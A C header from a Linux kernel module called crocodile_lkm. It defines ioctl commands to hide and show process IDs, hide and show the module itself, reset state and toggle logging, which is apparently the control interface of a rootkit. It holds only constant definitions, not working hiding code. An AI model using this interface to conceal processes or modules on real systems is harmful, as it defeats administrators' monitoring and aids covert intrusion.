/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _CROCODILE_LKM_CTRL_IOCTL_H_
#define _CROCODILE_LKM_CTRL_IOCTL_H_

/******************************************************************************
 * Ioctl definitions
 ******************************************************************************/

/* Use 'k' as magic number */
#define CROC_IOC_MAGIC          'k'

#define CROC_IOC_MAX_NR         16

#define CROC_IOC_HIDE_CMD       0b00001
#define CROC_IOC_SHOW_CMD       0b00010
#define CROC_IOC_PID            0b00100
#define CROC_IOC_HIDE_PID_CMD   CROC_IOC_PID | CROC_IOC_HIDE_CMD
#define CROC_IOC_SHOW_PID_CMD   CROC_IOC_PID | CROC_IOC_SHOW_CMD
#define CROC_IOC_MOD            0b01000
#define CROC_IOC_HIDE_MOD_CMD   CROC_IOC_MOD | CROC_IOC_HIDE_CMD
#define CROC_IOC_SHOW_MOD_CMD   CROC_IOC_MOD | CROC_IOC_SHOW_CMD
#define CROC_IOC_LOG            0b10000

#define CROC_IOC_RESET          _IO(CROC_IOC_MAGIC, 0)
#define CROC_IOC_HIDE_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_HIDE_PID_CMD, int)
#define CROC_IOC_SHOW_PID       _IOW(CROC_IOC_MAGIC,  CROC_IOC_SHOW_PID_CMD, int)
#define CROC_IOC_HIDE_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_HIDE_MOD_CMD, int)
#define CROC_IOC_SHOW_MOD       _IOW(CROC_IOC_MAGIC,  CROC_IOC_SHOW_MOD_CMD, int)

#endif /* _CROCODILE_LKM_CTRL_IOCTL_H_ */

